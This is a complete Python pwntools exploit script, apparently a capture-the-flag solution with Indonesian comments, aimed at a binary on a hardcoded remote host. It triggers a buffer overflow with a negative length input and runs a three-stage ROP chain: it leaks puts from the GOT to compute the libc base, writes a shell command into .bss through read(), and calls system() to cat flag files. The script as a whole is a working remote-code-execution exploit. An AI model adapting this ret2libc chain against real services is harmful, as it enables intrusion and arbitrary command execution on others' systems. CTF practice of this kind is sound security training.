#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import time

from pwn import *

HOST = "15.235.202.47"
PORT = 8999

OFFSET = 168
MAX_READ = 0xff

# Offset libc remote, diidentifikasi dari hasil DynELF sebelumnya.
PUTS_OFFSET = 0x80E50
SYSTEM_OFFSET = 0x50D70

PROMPT = b"Let me know the length of your buffer: \n"
INPUT_PROMPT = b"> \n"
FAKE_PREFIX = b"Here a fake flag for your effort: "

COMMAND_ADDR = 0x404700
COMMAND = (
    b"echo __EZPWN_BEGIN__; "
    b"cat flag* /flag /app/flag* 2>/dev/null; "
    b"echo __EZPWN_END__\x00"
)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default=HOST)
    parser.add_argument("port", nargs="?", type=int, default=PORT)
    parser.add_argument("--binary", default="./chall")
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--tries", type=int, default=8)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    context.binary = elf = ELF(args.binary, checksec=False)
    context.arch = "amd64"
    context.log_level = "debug" if args.debug else "info"

    rop = ROP(elf)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
    pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
    ret = rop.find_gadget(["ret"]).address

    if args.local:
        libc = elf.libc
        puts_offset = libc.sym["puts"]
        system_offset = libc.sym["system"]
    else:
        puts_offset = PUTS_OFFSET
        system_offset = SYSTEM_OFFSET

    def connect():
        if args.local:
            return process(elf.path)
        return remote(args.host, args.port, timeout=8)

    def begin_round(io) -> None:
        io.recvuntil(PROMPT)
        io.sendline(b"-1")
        io.recvuntil(INPUT_PROMPT)

    def send_overflow(io, payload: bytes) -> None:
        if len(payload) > MAX_READ:
            raise ValueError(
                f"payload terlalu panjang: {len(payload)} > {MAX_READ}"
            )

        io.send(payload.ljust(MAX_READ, b"X"))

    def consume_fake_line(io) -> bytes:
        io.recvuntil(FAKE_PREFIX)
        return io.recvuntil(b"\n", drop=True)

    def exploit() -> bytes:
        io = connect()

        try:
            # Stage 1: leak puts@GOT.
            begin_round(io)

            leak_payload = flat(
                {
                    OFFSET: [
                        pop_rdi,
                        elf.got["puts"],
                        elf.plt["puts"],
                        elf.sym["main"],
                    ]
                }
            )

            send_overflow(io, leak_payload)
            consume_fake_line(io)

            raw_leak = io.recvuntil(b"\n", drop=True)

            if not 4 <= len(raw_leak) <= 6:
                raise RuntimeError(
                    f"leak puts tidak valid: {raw_leak!r}"
                )

            puts_addr = u64(raw_leak.ljust(8, b"\x00"))
            libc_base = puts_addr - puts_offset

            if libc_base & 0xfff:
                raise RuntimeError(
                    f"libc base tidak page-aligned: {libc_base:#x}"
                )

            system_addr = libc_base + system_offset

            log.success(f"puts        = {puts_addr:#x}")
            log.success(f"libc base   = {libc_base:#x}")
            log.success(f"system      = {system_addr:#x}")

            # Stage 2: tulis command ke .bss.
            begin_round(io)

            write_payload = flat(
                {
                    OFFSET: [
                        pop_rdx,
                        len(COMMAND),
                        pop_rsi,
                        COMMAND_ADDR,
                        pop_rdi,
                        0,
                        elf.plt["read"],
                        elf.sym["main"],
                    ]
                }
            )

            send_overflow(io, write_payload)

            # Baris fake flag menandakan vulnerable read() sudah selesai.
            consume_fake_line(io)

            # ROP sekarang menunggu di read(0, COMMAND_ADDR, len(COMMAND)).
            io.send(COMMAND)

            # Stage 3: system(COMMAND_ADDR).
            begin_round(io)

            execute_payload = flat(
                {
                    OFFSET: [
                        ret,
                        pop_rdi,
                        COMMAND_ADDR,
                        system_addr,
                        elf.sym["main"],
                    ]
                }
            )

            send_overflow(io, execute_payload)

            return io.recvall(timeout=6)

        finally:
            try:
                io.close()
            except Exception:
                pass

    for attempt in range(1, args.tries + 1):
        log.info(f"attempt {attempt}/{args.tries}")

        try:
            output = exploit()
            print(output.decode(errors="replace"))

            match = re.search(rb"LYKNCTF\{[^}\r\n]+\}", output)

            if match:
                flag = match.group().decode()
                print(f"<FLAG>{flag}</FLAG>")
                return 0

            log.warning("Command jalan, tapi flag belum terdeteksi")

        except (EOFError, OSError, RuntimeError, ValueError) as exc:
            log.warning(f"retry: {exc}")

        time.sleep(0.3)

    log.failure("Semua attempt gagal")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
